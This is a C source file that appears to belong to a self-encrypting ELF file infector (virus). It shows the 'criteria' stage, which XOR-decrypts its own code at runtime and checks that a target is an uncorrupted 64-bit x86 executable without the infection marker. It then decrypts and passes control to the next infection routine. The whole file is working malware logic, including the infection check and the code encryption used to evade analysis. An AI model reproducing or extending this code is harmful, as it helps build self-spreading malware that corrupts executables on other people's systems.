#include <war.h>

////////////////////////////////////////////////////////////////////////////////
/// STATIC FUNCTIONS
////////////////////////////////////////////////////////////////////////////////

__attribute__((always_inline)) static inline bool is_corrupted(const struct s_host *host)
{
	return host->header->e_shoff + (host->header->e_shnum * sizeof(Elf64_Shdr)) != host->filesize;
}

__attribute__((always_inline)) static inline bool is_elf(const struct s_host *host)
{
	return *(uint32_t *)host->header == ELF_MAGIC_NUMBER;
}

__attribute__((always_inline)) static inline bool is_64(const struct s_host *host)
{
	return host->header->e_ident[EI_CLASS] == ELFCLASS64;
}

__attribute__((always_inline)) static inline bool is_x86(const struct s_host *host)
{
	return host->header->e_machine == EM_X86_64;
}

__attribute__((always_inline)) static inline bool is_executable(const struct s_host *host)
{
	return host->header->e_entry != 0;
}

__attribute__((always_inline)) static inline bool is_infected(const struct s_host *host)
{
	return *(unsigned int *)((char *)&host->header->e_ident[EI_PAD]) == PWN_MAGIC_NUMBER;
}

__attribute__((always_inline)) static inline void decrypt_left(const struct s_keychain *keychain, char *callee, const size_t size)
{
	for (register size_t index = 0; index < size; index++)
		callee[index] ^= keychain->key[LEFT];
}

////////////////////////////////////////////////////////////////////////////////
/// PUBLIC FUNCTION
////////////////////////////////////////////////////////////////////////////////

void criteria(struct s_host *host, struct s_keychain *keychain, enum e_context context)
{
#if LOGGER
	MID_LOGGER("criteria:\t\t");
#endif
	
	decrypt_left(keychain, (char *)host_constructor, (void *)criteria - (void *)host_constructor);

	if (context == FAILURE)
		goto label;

	if (is_corrupted(host) == true)
	{
		context = FAILURE;
		goto label;
	}
	if (is_elf(host) == false)
	{
		context = FAILURE;
		goto label;
	}
	if (is_64(host) == false)
	{
		context = FAILURE;
		goto label;
	}
	if (is_x86(host) == false)
	{
		context = FAILURE;
		goto label;
	}
	if (is_executable(host) == false)
	{
		context = FAILURE;
		goto label;
	}
	if (is_infected(host) == true)
	{
		context = FAILURE;
		goto label;
	}

label:
	update_keychain_left(keychain, (char *)criteria, (void *)corruption - (void *)criteria);
	decrypt_left(keychain, (char *)corruption, (void *)text_infection - (void *)corruption);

	corruption(host, keychain, context);
}
